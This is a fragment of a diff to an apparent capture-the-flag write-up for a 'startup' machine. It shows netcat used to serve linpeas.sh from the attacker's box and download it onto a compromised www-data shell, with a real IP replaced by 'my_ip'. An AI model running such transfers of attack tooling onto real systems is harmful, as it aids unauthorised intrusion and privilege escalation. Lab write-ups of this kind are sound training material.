@@ -118,7 +118,7 @@ on my side
 └─$ nc -lvp 9999 < ~/tools/linpeas.sh 
 
 
-www-data@startup:/tmp$ nc 10.8.203.221 9999 > linpeas.sh
+www-data@startup:/tmp$ nc my_ip 9999 > linpeas.sh
 
 found unexcepected folder called incidents and contain a .pcapng file so let's check it with wireshak .
 
